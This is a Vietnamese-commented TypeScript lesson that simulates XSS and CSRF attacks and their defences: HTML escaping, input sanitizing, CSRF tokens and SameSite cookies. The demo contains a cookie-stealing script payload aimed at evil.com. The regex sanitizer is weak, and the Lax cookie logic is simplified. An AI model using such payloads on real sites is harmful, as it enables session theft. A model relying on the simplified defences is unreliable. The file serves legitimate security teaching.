/**
 * 9.4 XSS & CSRF — Mô phỏng tấn công và phòng chống
 *
 * Phần 1 — XSS (Cross-Site Scripting):
 *   - Escape HTML khi render output (chống Reflected/Stored XSS)
 *   - Sanitize input (chặn tag `<script>`)
 *
 * Phần 2 — CSRF (Cross-Site Request Forgery):
 *   - CSRF token: server phát token, request phải kèm token đúng
 *   - SameSite=Strict: browser KHÔNG gửi cookie khi request cross-site
 *
 * Lưu ý: mô phỏng bằng TS thuần + node:crypto (không DOM, không browser).
 */

import { randomBytes } from "node:crypto";

// ────────────────────────── Phần 1: XSS ────────────────────────────────────
// ✅ Escape HTML — output luôn được coi là văn bản, không phải markup
function escapeHtml(input: string): string {
  const map: Record<string, string> = {
    "&": "&amp;",
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#39;",
  };
  return input.replace(/[&<>"']/g, (ch) => map[ch] ?? ch);
}

// ✅ Sanitize input — loại bỏ tag/script trước khi lưu vào DB
function sanitizeInput(input: string): string {
  return input
    .replace(/<script[\s\S]*?<\/script>/gi, "") // xóa <script>...</script>
    .replace(/<[^>]+>/g, ""); // xóa các tag HTML còn lại
}

// Mô phỏng comment trên forum (stored XSS scenario)
function renderComment(userInput: string, mode: "raw" | "escaped" | "sanitized"): string {
  let processed: string;
  if (mode === "raw") {
    processed = userInput;
  } else if (mode === "escaped") {
    processed = escapeHtml(userInput);
  } else {
    processed = escapeHtml(sanitizeInput(userInput));
  }
  return `<div class="comment">${processed}</div>`;
}

// ────────────────── Phần 2: CSRF token ─────────────────────────────────────
class CsrfTokenManager {
  private validTokens = new Set<string>();

  // Server phát token mới cho từng form/session
  issueToken(): string {
    const token = randomBytes(8).toString("hex");
    this.validTokens.add(token);
    console.log(`   🔑 Server phát CSRF token: ${token}`);
    return token;
  }

  // Server kiểm tra token gửi kèm request
  validate(token: string | null): boolean {
    if (!token || !this.validTokens.has(token)) return false;
    return true;
  }

  // Sau khi dùng (POST thành công) token bị tiêu hủy
  consume(token: string): void {
    this.validTokens.delete(token);
  }
}

// ─────────────────── Phần 2: SameSite Cookie simulation ────────────────────
type SameSiteValue = "Strict" | "Lax" | "None";

interface CsrfCookieOptions {
  httpOnly: boolean;
  secure: boolean;
  sameSite: SameSiteValue;
}

function serializeCookie(name: string, value: string, opts: CsrfCookieOptions): string {
  const parts = [`${name}=${value}`];
  if (opts.httpOnly) parts.push("HttpOnly");
  if (opts.secure) parts.push("Secure");
  if (opts.sameSite) parts.push(`SameSite=${opts.sameSite}`);
  return parts.join("; ");
}

// Browser mô phỏng quyết định có gửi cookie kèm request không
function wouldSendCookie(
  cookieOpts: CsrfCookieOptions,
  isCrossSite: boolean
): boolean {
  // SameSite=Strict: tuyệt đối không gửi khi cross-site
  if (cookieOpts.sameSite === "Strict" && isCrossSite) return false;
  // SameSite=Lax: chỉ không gửi với POST cross-site
  if (cookieOpts.sameSite === "Lax" && isCrossSite) return false;
  // SameSite=None: luôn gửi (mặc định — nguy hiểm nếu không có Secure)
  return true;
}

// ────────────────── Mô phỏng POST /transfer (hành động nhạy cảm) ───────────
interface CsrfRequest {
  amount: number;
  to: string;
  csrfToken: string | null; // token gửi kèm (nếu có)
  origin: string | null;
}

function handleTransfer(req: CsrfRequest, csrf: CsrfTokenManager): boolean {
  const token = req.csrfToken;
  // ✅ Bắt buộc kiểm tra token
  if (!token || !csrf.validate(token)) {
    console.log(`   ❌ Chặn: thiếu/sai CSRF token (origin=${req.origin ?? "none"})`);
    return false;
  }
  csrf.consume(token);
  console.log(
    `   ✅ Chuyển ${req.amount} VND đến ${req.to} (token hợp lệ)`
  );
  return true;
}

// ───────────────────────────────── Demo ─────────────────────────────────────
console.log("=== XSS & CSRF Demo ===");
console.log("");

console.log("1️⃣ XSS — Stored XSS trên forum:");
const evilComment = `Xin chào! <script>document.location='evil.com?c='+document.cookie</script>`;
console.log(`   Input: ${evilComment}`);
console.log(`   ❌ Raw:      ${renderComment(evilComment, "raw")}`);
console.log(`   ✅ Escaped:  ${renderComment(evilComment, "escaped")}`);
console.log(`   ✅ Sanitize: ${renderComment(evilComment, "sanitized")}`);
console.log("");

console.log("2️⃣ CSRF — Token check trên POST /transfer:");
const csrf = new CsrfTokenManager();
const goodToken = csrf.issueToken();
const badToken = "attacker-issued-token";
handleTransfer(
  { amount: 1000, to: "attacker", csrfToken: badToken, origin: "https://evil.com" },
  csrf
);
handleTransfer(
  { amount: 50, to: "alice", csrfToken: goodToken, origin: "https://bank.com" },
  csrf
);
console.log("");

console.log("3️⃣ CSRF — SameSite cookie quyết định việc gửi cookie:");
const strictCookie: CsrfCookieOptions = {
  httpOnly: true,
  secure: true,
  sameSite: "Strict",
};
const laxCookie: CsrfCookieOptions = {
  httpOnly: true,
  secure: true,
  sameSite: "Lax",
};
const noneCookie: CsrfCookieOptions = {
  httpOnly: true,
  secure: true,
  sameSite: "None",
};

console.log(`   Cookie Strict + POST cross-site → gửi cookie? ${wouldSendCookie(strictCookie, true)}`);
console.log(`   Cookie Lax    + POST cross-site → gửi cookie? ${wouldSendCookie(laxCookie, true)}`);
console.log(`   Cookie None   + POST cross-site → gửi cookie? ${wouldSendCookie(noneCookie, true)}`);
console.log(`   Cookie Strict + POST same-site  → gửi cookie? ${wouldSendCookie(strictCookie, false)}`);
console.log("");

console.log("   Ví dụ header set cookie:");
console.log(`   Set-Cookie: ${serializeCookie("session", goodToken, strictCookie)}`);
console.log("");

console.log("✅ Chống XSS: escape/sanitize mọi input-output. Chống CSRF: CSRF token trên mọi thao tác + SameSite=Strict/Lax + HttpOnly cookie.");
export {};